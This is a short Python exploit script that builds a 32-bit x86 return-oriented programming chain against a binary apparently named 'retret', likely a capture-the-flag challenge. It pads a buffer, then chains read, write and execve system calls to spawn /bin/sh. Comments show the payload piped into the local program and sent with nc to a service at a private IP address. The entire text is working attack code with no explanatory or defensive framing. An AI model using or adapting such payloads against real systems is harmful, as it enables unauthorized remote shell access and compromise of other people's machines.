
#0x08048375: pop ebx; ret
#0x08048542: int 0x80; ret
#0x08048552: pop eax; pop ecx; ret
#0x08048580: pop edx ret;


exploit = "A"*7680 

##############  read(0,0x0804a000, 8);

exploit += "\x75\x83\x04\x08"  # pop ebx; ret
exploit += "\x00\x00\x00\x00"  # ebx
exploit += "\x52\x85\x04\x08"  # pop eax; pop ecx; ret
exploit += "\x03\x00\x00\x00"  # eax system call : 0x03 : sys_read
exploit += "\x00\xa0\x04\x08"  # ecx 0x0804a000
exploit += "\x80\x85\x04\x08"  # pop edx; ret
exploit += "\x08\x00\x00\x00"  # edx 8
exploit += "\x42\x85\x04\x08"  # int 0x80; ret 

##############  write(1,0x0804a000, 8);

exploit += "\x75\x83\x04\x08"
exploit += "\x01\x00\x00\x00"  # ebx
exploit += "\x52\x85\x04\x08"
exploit += "\x04\x00\x00\x00"  # eax system call : 0x04 : sys_write
exploit += "\x00\xa0\x04\x08"  # ecx
exploit += "\x80\x85\x04\x08"
exploit += "\x08\x00\x00\x00"  # edx
exploit += "\x42\x85\x04\x08"


##############  execve(0x0804a000, 0, 0);

exploit += "\x75\x83\x04\x08"
exploit += "\x00\xa0\x04\x08"  # ebx
exploit += "\x52\x85\x04\x08"
exploit += "\x0b\x00\x00\x00"  # eax system call : 0x0b : sys_execve
exploit += "\x00\x00\x00\x00"  # ecx
exploit += "\x80\x85\x04\x08"
exploit += "\x00\x00\x00\x00"  # edx
exploit += "\x42\x85\x04\x08"

exploit += "A" * 416           # buffer full
exploit += "/bin/sh\x00"

f = open("in.txt", "w")
f.write(exploit)

# $ (cat in.txt; cat) | ./retret
# $ (cat in.txt; cat) | nc 192.168.0.25 11111
